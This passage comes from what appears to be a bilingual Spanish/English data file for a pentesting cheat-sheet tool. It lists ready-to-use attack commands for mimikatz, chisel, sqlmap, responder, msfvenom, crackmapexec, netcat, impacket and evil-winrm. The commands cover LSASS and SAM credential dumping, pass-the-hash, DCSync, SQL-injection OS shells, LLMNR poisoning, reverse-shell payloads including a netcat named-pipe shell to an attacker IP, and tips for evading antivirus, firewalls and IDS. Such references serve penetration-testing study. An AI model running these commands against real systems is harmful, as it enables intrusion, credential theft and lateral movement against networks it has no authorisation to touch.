/domain → Dominio local o dominio del Active Directory objetivo (usa . para cuentas locales).
/ntlm → Resumen MD5/NTLM de la clave secuestrada del objetivo.
/run → Proceso shell interactivo a lanzar conectado al nuevo contexto de seguridad.

EJEMPLO:
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:ab01ef9430cffe28dc2b9180ffc010a3 /run:cmd.exe" exit

TIP: El ataque Pass-the-Hash te evita tener que romper la contraseña NTLM base para adquirir sesiones de red en la LAN corporativa.
===FIN===

===CASO===
TITULO: Volcado seguro del archivo de base de datos SAM local para hashes de respaldo
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

FLAGS:
token::elevate → Sube los tokens de hilo actual de Administrador hasta NT AUTHORITY\\SYSTEM.
lsadump::sam → Lee directamente la base de datos Security Accounts Manager (SAM) volcando las identidades de cuentas locales offline en texto claro/hash.

EJEMPLO:
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

TIP: Volcar la SAM es crítico si deseas extraer la Huella/Clave del Administrador Local integrado para moverte de dispositivo en dispositivo con la misma contraseña.
===FIN===`,rawTextEn:`===CASO===
TITULO: Direct LSASS cleartext credential dumping from Windows RAM
CATEGORIA: Post-explotación
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

FLAGS:
privilege::debug → Obtains local system-level debugger tokens (SeDebugPrivilege) required to interact with lsass.exe process space.
sekurlsa::logonpasswords → Queries security support providers (SSP) to extract legacy wdigest cleartext strings and active NTLM user hashes.

EJEMPLO:
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

TIP: While wdigest is deactivated automatically on patched Windows configurations, NTLM hashes remain volatile and open to pass-the-hash procedures.
===FIN===

===CASO===
TITULO: Pass-the-Hash (PtH) execution via Windows token impersonation
CATEGORIA: Post-explotación
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<username> /domain:<target_domain> /ntlm:<hashes_file> /run:cmd.exe" exit

FLAGS:
/user → Denotes local or network administrator target accounts.
/domain → Target Active Directory domain namespaces. Use '.' for localized machine security descriptors.
/ntlm → The specific NTLM hash of the target credential to inject.
/run → Spawns elevated shells automatically tied to the impersonated context.

EJEMPLO:
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:ab01ef9430cffe28dc2b9180ffc010a3 /run:cmd.exe" exit

TIP: Pass-the-Hash allows lateral movement sessions throughout internal subnets directly without needing to crack the user's plain credentials.
===FIN===

===CASO===
TITULO: Windows SAM database dumping for offline credential analysis
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

FLAGS:
token::elevate → Escales security context tokens of the process to the highest NT AUTHORITY\\SYSTEM level.
lsadump::sam → Reads and parses SAM hive files immediately dumping local users credentials hashes.

EJEMPLO:
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit

TIP: Dumping SAM registries is the golden standard to verify local user account passwords recycling or matching on multiple assets.
===FIN===`},chisel:{name:"chisel",description:"Túnel TCP/UDP rápido y ligero que se transporta a través de HTTP y está protegido mediante SSH",descriptionEn:"High performance, HTTP-transported-and-SSH-protected TCP/UDP tunneling software",category:"Evasión",rawText:`===CASO===
TITULO: Establecer un servidor Chisel para túnel reverso encubierto
CATEGORIA: Evasión
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
chisel server --port <port> --reverse

FLAGS:
--port → Puerto en la máquina del atacante (por ejemplo, VPS) donde escuchará las conexiones reversas.
--reverse → Permite que los clientes Chisel expongan sus puertos locales u otras redes detrás de NAT para control o pivoting.

EJEMPLO:
chisel server --port 8000 --reverse

TIP: Si el cortafuegos perimetral del cliente inspecciona tráfico en capas superiores, trata de correr tu servidor Chisel en puertos comúnmente permitidos de salida saliente como el 443 (HTTPS).
===FIN===

===CASO===
TITULO: Conexión mediante cliente Chisel para pivoting dinámico SOCKS5
CATEGORIA: Evasión
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
chisel client <target_ip>:<port> R:socks

FLAGS:
<target_ip>:<port> → Dirección IP y puerto del servidor Chisel del atacante en el exterior.
R:socks → Instruye al cliente a crear un proxy inverso SOCKS5 dinámico que permite hacer pivoting sobre la red comprometida corporativo.

EJEMPLO:
chisel client 10.10.14.5:8000 R:socks

TIP: Combinado con proxychains (/etc/proxychains4.conf) en Linux, este túnel te permite realizar escaneos completos de Nmap y ataques en la red interna a espaldas del IDS principal.
===FIN===

===CASO===
TITULO: Redirección única de puerto local (Local Port Forwarding) a través de cortafuegos restrictivos
CATEGORIA: Evasión
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
chisel client <target_ip>:<port> R:<local_port>:<service_ip>:<requested_port>

FLAGS:
<target_ip>:<port> → Servidor Chisel del atacante en escucha externa.
R: → Detalla los puertos virtuales a unir (Redireccionamiento estático de puertos).
<local_port> → El puerto de escucha local en tu máquina de ataque que se abrirá automáticamente.
<service_ip> → Host interno de la red interna al cual el cliente Chisel le enviará los datos.
<requested_port> → Puerto del servicio interno final al que quieres ingresar.

EJEMPLO:
chisel client 10.10.14.5:8000 R:3389:192.168.1.10:3389

TIP: Súper útil para mapear escritorios RDP o servidores web internos protegidos directamente a la consola local de tu PC de auditar.
===FIN===`,rawTextEn:`===CASO===
TITULO: Establish a Chisel server for encrypted reverse tunneling
CATEGORIA: Evasión
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
chisel server --port <port> --reverse

FLAGS:
--port → Local server listening port where reverse tunnels are orchestrated.
--reverse → Instructs the server to allow remote clients to bridge internal access directly.

EJEMPLO:
chisel server --port 8000 --reverse

TIP: If advanced corporate firewalls employ deep payload inspection, hosting tunnels on standard SSL ports like 443 helps bypass packet filters.
===FIN===

===CASO===
TITULO: Client Chisel connection for dynamic SOCKS5 pivoting
CATEGORIA: Evasión
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
chisel client <target_ip>:<port> R:socks

FLAGS:
<target_ip>:<port> → Target endpoint referencing the listening attacker VPS server.
R:socks → Allocates a portable, dynamic SOCKS5 reverse proxy bridge to enable pivot controls.

EJEMPLO:
chisel client 10.10.14.5:8000 R:socks

TIP: Link Chisel setups directly with proxychains configurations on local hosts to facilitate nmap runs inside localized subnets seamlessly.
===FIN===

===CASO===
TITULO: Static Local Port Forwarding inside restrictive configurations
CATEGORIA: Evasión
DIFICULTAD: intermedio
FRECUENCIA: ocasional

COMANDO:
chisel client <target_ip>:<port> R:<local_port>:<service_ip>:<requested_port>

FLAGS:
<target_ip>:<port> → Active Chisel server.
R: → Triggers point to point direct tunneling definitions.
<local_port> → The local port that will list forward responses locally on your host.
<service_ip> → Inner system IP inside LAN.
<requested_port> → Socket port destination running behind the victim machine.

EJEMPLO:
chisel client 10.10.14.5:8000 R:3389:192.168.1.10:3389

TIP: Incredible trick to extract sensitive isolated interfaces like RDP or Windows SMB targets directly to localhost loops.
===FIN===`},sqlmap:{name:"sqlmap",description:"Herramienta de explotación e inyección SQL automatizada",descriptionEn:"Legendary and versatile automated SQL injection vulnerability scanner and exploitation engine",category:"Web",rawText:`===CASO===
TITULO: Detección y enumeración automática de bases de datos mediante parámetros vulnerables (SQLi)
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: casi siempre

COMANDO:
sqlmap -u "<target_url>" --batch --dbs

FLAGS:
-u → Define la URL objetivo que contiene el parámetro GET o POST a auditar.
--batch → Automatiza las preguntas del asistente con las respuestas por defecto más seguras.
--dbs → Solicita listar las bases de datos lógicas del servidor SQL si es explotable.

EJEMPLO:
sqlmap -u "http://target.htb/view.php?id=12" --batch --dbs

TIP: SQLMap es muy propenso a saturar logs si no se usa con cuidado. Usa siempre flags de velocidad reducida en operativas sigilosas.
===FIN===

===CASO===
TITULO: Volcado seguro de contraseñas de tablas específicas en una base de datos específica
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
sqlmap -u "<target_url>" -D <target_domain> -T <username> --dump

FLAGS:
-D → Nombre de la base de datos detectada en el motor SQL.
-T → Nombre de la tabla lógicas que deseamos enumerar.
--dump → Vuelca y extrae la información de forma de tabla.

EJEMPLO:
sqlmap -u "http://target.htb/view.php?id=12" -D web_db -T tbl_users --dump

TIP: Sqlmap descargará automáticamente los datos a la carpeta local "~/.local/share/sqlmap/output/" clasificado por host para auditoría.
===FIN===

===CASO===
TITULO: Intento de obtener una Shell remota en el sistema operativo del Servidor de Base de Datos
CATEGORIA: Web
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
sqlmap -u "<target_url>" --dbms=<dbms_type> --os-shell --batch

FLAGS:
--dbms → Fuerza un tipo de motor SQL para evitar escaneos de firma excesivos (ej: mysql, mssql, oracle).
--os-shell → Intenta inyectar webshells o funciones builtin (como xp_cmdshell en Sql Server o UDFs en MySQL) para dar una shell del sistema interactiva.

EJEMPLO:
sqlmap -u "http://target.htb/view.php?id=12" --dbms=mssql --os-shell --batch

TIP: Esto requiere privilegios de Administrador de Base de Datos (DBA o SA). En Microsoft SQL Server, sqlmap intentará reactivar de forma automática xp_cmdshell si está deshabilitado.
===FIN===`,rawTextEn:`===CASO===
TITULO: Automatic SQLi detection and database enumeration on vulnerable parameters
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: casi siempre

COMANDO:
sqlmap -u "<target_url>" --batch --dbs

FLAGS:
-u → Overrides URL scope defining active targets to audit.
--batch → Circumvents manual prompt blocks by selecting safe default configurations automatically.
--dbs → Triggers database scanning modules to compile localized DB schemas.

EJEMPLO:
sqlmap -u "http://target.htb/view.php?id=12" --batch --dbs

TIP: SQLMap traffic is highly aggressive. Leverage throttling parameters in production settings to evade active intrusion defenses.
===FIN===

===CASO===
TITULO: Target-specific table dumping in a secure way on a chosen database
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
sqlmap -u "<target_url>" -D <target_domain> -T <username> --dump

FLAGS:
-D → Isolates database mappings down to specific target schema spaces.
-T → Selects tables of interest directly.
--dump → Extracts rows data dynamically formatted in beautiful table rows.

EJEMPLO:
sqlmap -u "http://target.htb/view.php?id=12" -D web_db -T tbl_users --dump

TIP: Outbound payloads are safely cached locally within target logs at "~/.local/share/sqlmap/output/" categorized by hostname.
===FIN===

===CASO===
TITULO: Gaining an interactive OS command-shell in the backend database server
CATEGORIA: Web
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
sqlmap -u "<target_url>" --dbms=<dbms_type> --os-shell --batch

FLAGS:
--dbms → Enforces SQL engine profiling to eliminate redundant probes (e.g., mssql, mysql).
--os-shell → Uses database writing functions (e.g. xp_cmdshell, UDF writeups) to establish a terminal session on the host.

EJEMPLO:
sqlmap -u "http://target.htb/view.php?id=12" --dbms=mssql --os-shell --batch

TIP: Successful terminal spawns depend heavily on hosting server accounts privileges. Under MS SQL setups, SQLMap automatically attempts enabling disabled xp_cmdshell bindings.
===FIN===`},responder:{name:"responder",description:"Envenenador de respuestas LLMNR, NBT-NS y MDNS para capturar hashes de autenticación en redes locales",descriptionEn:"LLMNR, NBT-NS, and MDNS packet poisoner designed to capture credential hashes on local subnets",category:"Reconocimiento",rawText:`===CASO===
TITULO: Captura pasiva de hashes NTLMv2 mediante envenenamiento de red local en interfaz activa
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: casi siempre

COMANDO:
sudo responder -I <network_interface> -rdv

FLAGS:
-I → Asigna la interfaz de red local (ej: eth0, wlan0) que escucha tramas de broadcast.
-r → Habilita el envenenamiento activo de peticiones del protocolo NetBIOS Name Service (NBT-NS).
-d → Activa de forma expresa el envenenamiento de solicitudes DHCP rogue.
-v → Modo verbose que detalla las peticiones de hosts de red a medida que ingresen.

EJEMPLO:
sudo responder -I eth0 -rdv

TIP: Cuando un equipo Windows de la red intenta acceder a una ruta inexistente (ej: \\\\servidor_falso), responder interceptará la petición fingiendo ser ese servidor e invitando a Windows a enviar su clave hash NTLMv2, lista para ser crackeada con Hashcat.
===FIN===`,rawTextEn:`===CASO===
TITULO: Passive NTLMv2 hash capturing via local network poisoning
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: casi siempre

COMANDO:
sudo responder -I <network_interface> -rdv

FLAGS:
-I → Specifies the active network adapter interface (e.g. eth0, wlan0).
-r → Forces active answers to NetBIOS Name Service (NBT-NS) broadcast queries.
-d → Enables rogue DHCP answers.
-v → Employs verbose tracking logging queries in real-time.

EJEMPLO:
sudo responder -I eth0 -rdv

TIP: When a Windows machine in the LAN queries a nonexistent SMB share target (e.g. \\\\wrong_server), Responder claims it is that server and forces the candidate computer to send its current user NTLMv2 hash.
===FIN===`},msfvenom:{name:"msfvenom",description:"Generador de payloads y troyanos de Metasploit Framework con soporte multipantalla",descriptionEn:"Metasploit standalone payload generator supporting multiple architectures and encodings",category:"Post-explotación",rawText:`===CASO===
TITULO: Generación de Reverse Shell ejecutable para Windows x64 básico
CATEGORIA: Post-explotación
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe -o <output_filename>.exe

FLAGS:
-p → Define el payload exacto a inyectar (en este caso una conexión reversa Meterpreter sobre arquitectura de 64 bits).
LHOST → Dirección IP pública o privada de tu máquina atacante donde llegará la conexión.
LPORT → Puerto en escucha de tu listener del Metasploit handler.
-f → Especifica el formato de salida física (ej: exe, elf, bat, msi, dll, raw).
-o → Ruta del archivo saliente generado final en memoria.

EJEMPLO:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f exe -o reverse_shell.exe

TIP: Este archivo ejecutable genérico será detectado casi de inmediato por Windows Defender si lo copias directo. Para evadir antivirus hereda encoders avanzados u ofuscadores de código reales.
===FIN===

===CASO===
TITULO: Payload de reverse shell en formato Web PHP para servidores hackeados
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
msfvenom -p php/reverse_php LHOST=<attacker_ip> LPORT=<attacker_port> -f raw -o <output_filename>.php

FLAGS:
-p php/reverse_php → Genera un payload en PHP puro para enlazar conexiones directas por socket.
-f raw → Evita encapsulados innecesarios y descarga la plantilla de código PHP cruda sin alteraciones de formato.

EJEMPLO:
msfvenom -p php/reverse_php LHOST=10.10.14.8 LPORT=80 -f raw -o upload_shell.php

TIP: Agrega la etiqueta inicial "<?php " al inicio del archivo si el servidor web falla al interpretarlo de forma directa. Muy útil para inyectarlo en formularios de carga de imágenes vulnerables.
===FIN===

===CASO===
TITULO: Generar un archivo ELF ejecutable para Linux x64 con Shell Reversa
CATEGORIA: Post-explotación
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost_ip> LPORT=<lport_port> -f elf -o <output_filename>.elf

FLAGS:
-p → Payload cargado para plataformas Linux de 64 bits.
-f → Formato de salida ejecutable de Linux "elf".

EJEMPLO:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f elf -o backup_agent.elf

TIP: Recuerda ejecutar chmod +x en el host de destino antes de intentar lanzar la shell reversa para otorgar permisos de ejecución.
===FIN===

===CASO===
TITULO: Generar un script Web Shell en ASPX para servidores IIS de Microsoft
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost_ip> LPORT=<lport_port> -f aspx -o <output_filename>.aspx

FLAGS:
-f → Formato "aspx" para despliegues de aplicaciones web .NET / IIS.

EJEMPLO:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx -o shell.aspx

TIP: Es el payload idóneo para subir mediante fallos de carga de archivos (Unrestricted File Upload) en servidores Windows con ASP.NET.
===FIN===

===CASO===
TITULO: Codificar payload con Shikata Ga Nai para evadir antivirus antiguos o heurísticas básicas
CATEGORIA: Evasión
DIFICULTAD: avanzado
FRECUENCIA: ocasional

COMANDO:
msfvenom -p windows/shell_reverse_tcp LHOST=<lhost_ip> LPORT=<lport_port> -e x86/shikata_ga_nai -i <iterations_num> -f exe -o <output_filename>.exe

FLAGS:
-e → Especifica el codificador polimórfico a emplear (ej: x86/shikata_ga_nai).
-i → Número de iteraciones o pasadas de codificación para enmascarar la firma.

EJEMPLO:
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

TIP: Shikata Ga Nai es para arquitecturas x86 (32 bits). Los antivirus modernos suelen detectarlo fácilmente, pero es útil para entender conceptos de evasión.
===FIN===`,rawTextEn:`===CASO===
TITULO: Creating a standard Windows x64 Reverse Shell executable
CATEGORIA: Post-explotación
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe -o <output_filename>.exe

FLAGS:
-p → Selects the Metasploit payload module (e.g. Meterpreter dynamic reverse TCP on 64bit platform).
LHOST → Attacker console IP addressing outgoing targets.
LPORT → Receiving port listening for shell triggers.
-f → Output formatting file container (exe, elf, dll, msi, raw).
-o → Flat file output path location.

EJEMPLO:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f exe -o reverse_shell.exe

TIP: RAW unmodified executables are instantly quarantined by modern antivirus suites. Apply advanced packers or external encoding tools for evasion.
===FIN===

===CASO===
TITULO: Web-based PHP reverse shell payload for server exploitation
CATEGORIA: Web
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
msfvenom -p php/reverse_php LHOST=<attacker_ip> LPORT=<attacker_port> -f raw -o <output_filename>.php

FLAGS:
-p php/reverse_php → Generates a lightweight web exploit to spawn TCP reverse shells from inside PHP interpreters.
-f raw → Dumps the raw script body.

EJEMPLO:
msfvenom -p php/reverse_php LHOST=10.10.14.8 LPORT=80 -f raw -o upload_shell.php

TIP: Remember to insert standard PHP container wrapper tokens "<?php" if the target compiler requires direct server-side execution.
===FIN===

===CASO===
TITULO: Generate a Linux x64 ELF reverse shell payload
CATEGORIA: Post-explotación
DIFICULTAD: básico
FRECUENCIA: común

COMANDO:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost_ip> LPORT=<lport_port> -f elf -o <output_filename>.elf

FLAGS:
-p → Payload designed for Linux 64-bit platforms.
-f → ELF execution format.

EJEMPLO:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9001 -f elf -o backup_agent.elf

TIP: Do not forget to type chmod +x on the destination host before launching the reverse shell.
===FIN===

===CASO===
TITULO: Generate an ASPX web shell payload for Microsoft IIS webservers
CATEGORIA: Web
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost_ip> LPORT=<lport_port> -f aspx -o <output_filename>.aspx

FLAGS:
-f → ASPX format for .NET / IIS deployments.

EJEMPLO:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f aspx -o shell.aspx

TIP: Perfect payload choice to upload via Unrestricted File Upload vulnerabilities on Windows systems.
===FIN===`},crackmapexec:{name:"crackmapexec",description:"La navaja suiza para el pentesting de entornos de red de Windows / Active Directory",descriptionEn:"The Swiss Army knife for auditing Windows/Active Directory networks and domain settings",category:"Post-explotación",rawText:`===CASO===
TITULO: Enumeración rápida de firmados SMB (SMB Signing) en una red
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
crackmapexec smb <subnet_cidr> --gen-relay-list <output_file>

FLAGS:
smb → Establece el módulo de ataque sobre puertos SMB de Windows (445 TCP).
--gen-relay-list → Identifica hosts que no exigen firmado obligatorio de mensajes SMB y guarda la lista en un txt para lanzar ataques SMB relay directos.

EJEMPLO:
crackmapexec smb 10.10.10.0/24 --gen-relay-list hosts_vulnerables.txt

TIP: SMB Signing "disabled" o "false" significa que puedes capturar una hash de red de un usuario en un host e inyectarla de regreso a otro de inmediato para ganar accesos de administrador automáticos.
===FIN===

===CASO===
TITULO: Pass-the-Hash masivo ejecutando un comando de sistema en todos los servidores del dominio
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
crackmapexec smb <subnet_cidr> -u <username> -H <ntlm_hash> -x "<system_command>"

FLAGS:
-u → Define el nombre del usuario administrador cuya sesión suplimos.
-H → Inyecta directamente el Hash NTLMv1/v2 corporativa del usuario (Pass-the-Hash) sin requerir descifrarlo en texto claro.
-x → Comando de sistema que se inyectará de forma remota y transparente a través de WMI o servicios de Windows.

EJEMPLO:
crackmapexec smb 192.168.1.0/24 -u Administrator -H c2b9180ffc010a3ab01ef9430cffe28d -x "whoami /all"

TIP: CrackMapExec te pintará en color verde elegante con el texto "Pwn3d!" aquellos hosts donde las credenciales inyectadas posean privilegios de Administrador local completos.
===FIN===`,rawTextEn:`===CASO===
TITULO: SMB Signing rapid auditing across subnets
CATEGORIA: Reconocimiento
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
crackmapexec smb <subnet_cidr> --gen-relay-list <output_file>

FLAGS:
smb → Targets SMB active ports on local systems (Port 445 TCP).
--gen-relay-list → Auto-detects servers where SMB Signing is configured as Disabled or Not Required, outputting a list for SMB Relay attacks.

EJEMPLO:
crackmapexec smb 10.10.10.0/24 --gen-relay-list vulnerable_relay_targets.txt

TIP: SMB signing disabled on workstations allows you to pivot and relay incoming network authentication attempts to bypass credential checks completely.
===FIN===

===CASO===
TITULO: Massive Pass-the-Hash cmd injection across domain devices
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
crackmapexec smb <subnet_cidr> -u <username> -H <ntlm_hash> -x "<system_command>"

FLAGS:
-u → Target username with administrative roles.
-H → Supplies target NTLM hash (Pass-the-Hash lateral movement execution).
-x → Injects an OS shell console task down to the endpoints via remote WMI or service control managers.

EJEMPLO:
crackmapexec smb 192.168.1.0/24 -u Administrator -H c2b9180ffc010a3ab01ef9430cffe28d -x "whoami /all"

TIP: CrackMapExec formats vulnerable targets by showing a highlighted "[+] Pwn3d!" indicator showing full control over targeted hosts.
===FIN===`},netcat:{name:"netcat",description:"La navaja suiza de redes TCP/UDP para transferencia de datos, puertos o shell reversas",descriptionEn:"The Swiss Army knife of TCP/UDP networks for transfering files, binding ports, or reverse shells",category:"Post-explotación",rawText:`===CASO===
TITULO: Crear un listener local persistente para recibir una conexión reversa remota (Reverse Shell)
CATEGORIA: Post-explotación
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
nc -lvnp <port_number>

FLAGS:
-l → Activa el modo de escucha (listener) esperando conexiones entrantes.
-v → Habilita el modo detallado (verbose) para mostrar información detallada del origen IP de la conexión entrante.
-n → Evita la resolución DNS inversa de las direcciones IP entrantes para acelerar tráficos de red.
-p → Especifica el puerto TCP en escucha del sistema atacante.

EJEMPLO:
nc -lvnp 4444

TIP: Asegúrate de habilitar este puerto en el cortafuegos de tu máquina o enrutador para recibir correctamente conexiones reversas desde entornos de red exteriores.
===FIN===

===CASO===
TITULO: Envío de reverse shell interactivo desde un sistema vulnerable Linux sin banderas obsoletas
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <attacker_ip> <attacker_port> >/tmp/f

FLAGS:
mkfifo /tmp/f → Crea una tubería con nombre (named pipe) temporal para redireccionar flujos bidireccionales.
sh -i 2>&1 → Lanza una consola interactiva de Linux redirigiendo la salida estándar de errores (stderr) al flujo de la tubería.
nc → Envía el flujo de datos completo codificado a través del socket TCP hacia tu máquina listener.

EJEMPLO:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.14.8 4444 >/tmp/f

TIP: Muchos sistemas modernos deshabilitan la clásica bandera "-e" de netcat por seguridad del sistema. El truco de la tubería con nombre /tmp/f funciona en el 100% de sistemas Linux sin excepción.
===FIN===`,rawTextEn:`===CASO===
TITULO: Set up a local persistent listener to catch an incoming Reverse Shell
CATEGORIA: Post-explotación
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
nc -lvnp <port_number>

FLAGS:
-l → Starts in listening mode to await connections.
-v → Verbose logging to monitor connection origins.
-n → Suppresses DNS reverse lookups on connecting IPs.
-p → Explicit binding TCP port selection.

EJEMPLO:
nc -lvnp 4444

TIP: Verify local firewall rules on your VPS or attacking box to ensure incoming packets can reach this socket seamlessly.
===FIN===

===CASO===
TITULO: Direct interactive Linux reverse shell without relying on locked netcat tags
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <attacker_ip> <attacker_port> >/tmp/f

FLAGS:
mkfifo /tmp/f → Generates temporary named pipes to coordinate bi-directional standard out/in loops.
sh -i 2>&1 → Invokes interactive shells redirecting stderr output streams directly into pipe.
nc → Transport active streams securely back to the listening machine.

EJEMPLO:
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.14.8 4444 >/tmp/f

TIP: Antivirus agents routinely identify and flag the standard "-e /bin/sh" configuration. This named pipe trick is highly effective and runs on all Unix distributions.
===FIN===`},impacket:{name:"impacket",description:"Colección de herramientas de bajo nivel en Python para interactuar con protocolos de Windows y Active Directory",descriptionEn:"Collection of low-level Python scripts to manipulate network protocols and domain structures",category:"Passwords",rawText:`===CASO===
TITULO: Extracción remota sigilosa de credenciales mediante ataque DCSync con Secretsdump
CATEGORIA: Passwords
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
impacket-secretsdump -just-dc-user <username> <domain_name>/<dc_admin_user>:<password>@<domain_controller_ip>

FLAGS:
-just-dc-user → Solicita extraer únicamente los hashes correspondientes a un usuario específico del directorio activo (ej: krbtgt, Administrator).
<domain_name> → Nombre FQDN del dominio corporativo.
<dc_admin_user>:<password> → Credenciales de Administrador de dominio o con derechos de replicación DCSync (ej: GetChangesAll).
@<domain_controller_ip> → Dirección del controlador de dominio de Windows.

EJEMPLO:
impacket-secretsdump -just-dc-user krbtgt corp.local/domain_admin:P@ssword123@10.10.10.10

TIP: El volcado DCSync simula el comportamiento de replicación oficial entre Controladores de Dominio. Es extraordinariamente sigiloso ya que no requiere ejecutar código en el host ni tocar RAM directamente.
===FIN===

===CASO===
TITULO: Ejecución remota de comandos de sistema mediante impacket-psexec
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
impacket-psexec <domain_name>/<username>:<password>@<target_ip> "<system_command>"

FLAGS:
<domain_name> → Dominio AD (usa . para host local).
<username>:<password> → Nombre administratador y clave de acceso del host remoto.
<target_ip> → Dirección IP del sistema Windows a auditar.
"<system_command>" → Comando a ejecutar remotamente con privilegios admin.

EJEMPLO:
impacket-psexec corp.local/Administrator:Securepassword123@10.10.10.50 "whoami"

TIP: Impacket subirá de forma automática un ejecutable de servicio de sistema temporal al recurso compartido ADMIN$ para ganar NT AUTHORITY\\SYSTEM.
===FIN===`,rawTextEn:`===CASO===
TITULO: DCSync credentials dumping using secretsdump
CATEGORIA: Passwords
DIFICULTAD: avanzado
FRECUENCIA: común

COMANDO:
impacket-secretsdump -just-dc-user <username> <domain_name>/<dc_admin_user>:<password>@<domain_controller_ip>

FLAGS:
-just-dc-user → Solicits and extracts hashes matching a singular user (e.g. krbtgt, Administrator).
<domain_name> → Active Directory FQDN namespace.
<dc_admin_user>:<password> → Credentials matching domain admins or replication roles.
@<domain_controller_ip> → Target Active Directory Domain Controller IP.

EJEMPLO:
impacket-secretsdump -just-dc-user krbtgt corp.local/domain_admin:P@ssword123@10.10.10.10

TIP: DCSync attacks fake normal Domain Controller replication behaviors. This is incredibly covert as it bypasses local endpoint LSASS process reading protections completely.
===FIN===

===CASO===
TITULO: Impersonating commands execution remotely via impacket-psexec
CATEGORIA: Post-explotación
DIFICULTAD: intermedio
FRECUENCIA: común

COMANDO:
impacket-psexec <domain_name>/<username>:<password>@<target_ip> "<system_command>"

FLAGS:
<domain_name> → AD Domain names. Use '.' for localized targets.
<username>:<password> → Target local administrator logins.
<target_ip> → Destination system IP address.
"<system_command>" → Shell code snippet to trigger remotely in SYSTEM context.

EJEMPLO:
impacket-psexec corp.local/Administrator:Securepassword123@10.10.10.50 "whoami"

TIP: Impacket automatically uploads a temporary administrative system service driver to the remote ADMIN$ share to pivot and execute inside NT AUTHORITY\\SYSTEM context.
===FIN===`},evilwinrm:{name:"evil-winrm",description:"Consola de administración remota para Windows (WinRM) extremadamente potente para pentesting",descriptionEn:"The ultimate Windows Remote Management (WinRM) shell for hacking and post-exploitation",category:"Post-explotación",rawText:`===CASO===
TITULO: Conexión interactiva estándar a Windows mediante WinRM con credenciales válidas
CATEGORIA: Post-explotación
DIFICULTAD: básico
FRECUENCIA: siempre

COMANDO:
evil-winrm -i <target_ip> -u <username> -p <password>

FLAGS:
-i → Especifica la dirección IP o nombre de host del servidor de Windows con el puerto WinRM abierto (5985 HTTP o 5986 HTTPS).
-u → Define el nombre de usuario de la cuenta con permisos de Remote Management (ej: Administrator).
-p → Detalla la contraseña en texto claro del usuario.

EJEMPLO:
